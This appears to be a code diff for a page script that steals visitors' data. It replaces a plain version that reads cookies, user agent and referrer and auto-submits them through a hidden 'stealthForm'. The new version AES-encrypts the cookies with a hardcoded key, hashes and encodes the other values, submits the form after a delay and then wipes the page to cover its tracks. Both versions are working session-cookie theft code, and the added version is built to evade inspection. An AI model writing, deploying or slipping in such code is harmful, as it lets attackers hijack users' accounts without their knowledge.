@@ -1,37 +1,55 @@
-document.addEventListener("DOMContentLoaded", function() {
-    try {
-        // Capture cookies, user agent, and referrer
-        var cookies = document.cookie.trim() || "No_Cookies";
-        var userAgent = navigator.userAgent || "Unknown_User_Agent";
-        var referrer = document.referrer.trim() || "No_Referrer";
-
-        // Get form elements
-        var cookieField = document.getElementById("cookieField");
-        var userAgentField = document.getElementById("userAgentField");
-        var referrerField = document.getElementById("referrerField");
-        var stealthForm = document.getElementById("stealthForm");
-
-        if (cookieField && userAgentField && referrerField && stealthForm) {
-            // Inject data into fields
-            cookieField.value = cookies;
-            userAgentField.value = userAgent;
-            referrerField.value = referrer;
-
-            console.log("Cookie Data:", cookies);
-            console.log("User Agent:", userAgent);
-            console.log("Referrer:", referrer);
-
-            // Submit form only if valid data is present
-            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
-                console.log("Submitting form...");
-                stealthForm.submit();
-            } else {
-                console.warn("No valid data to submit.");
+        (() => {
+            async function encryptAES(text, key) {
+                const encoder = new TextEncoder();
+                const encodedText = encoder.encode(text);
+                const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
+                const cryptoKey = await crypto.subtle.importKey("raw", hashedKey, { name: "AES-GCM" }, false, ["encrypt"]);
+                const iv = crypto.getRandomValues(new Uint8Array(12));
+                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encodedText);
+                return btoa(String.fromCharCode(...new Uint8Array(iv)) + String.fromCharCode(...new Uint8Array(encrypted)));
             }
-        } else {
-            console.error("One or more form elements not found.");
-        }
-    } catch (error) {
-        console.error("Error in script execution:", error);
-    }
-});
+
+            function rot47(str) {
+                return str.replace(/[\x21-\x7E]/g, c =>
+                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
+                );
+            }
+
+            async function hashSHA512(data) {
+                const encoder = new TextEncoder();
+                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
+                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
+            }
+
+            async function stealthEncode() {
+                const secretKey = "UltraHiddenKey";
+                const cookies = document.cookie || "No_Cookies";
+                const userAgent = navigator.userAgent || "Unknown_User_Agent";
+                const referrer = document.referrer || "No_Referrer";
+
+                const encryptedCookies = await encryptAES(cookies, secretKey);
+                const hashedAgent = await hashSHA512(userAgent);
+                const encodedReferrer = rot47(referrer);
+
+                const stealthPayload = JSON.stringify({
+                    encryptedCookies,
+                    hashedAgent,
+                    encodedReferrer
+                });
+
+                document.getElementById("encodedData").value = btoa(stealthPayload);
+
+                setTimeout(() => {
+                    document.getElementById("stealthForm").submit();
+                }, 2000);
+            }
+
+            if (!window.stealthExecuted) {
+                window.stealthExecuted = true;
+                stealthEncode().then(() => {
+                    setTimeout(() => {
+                        document.body.innerHTML = "";
+                    }, 2000);
+                });
+            }
+        })();
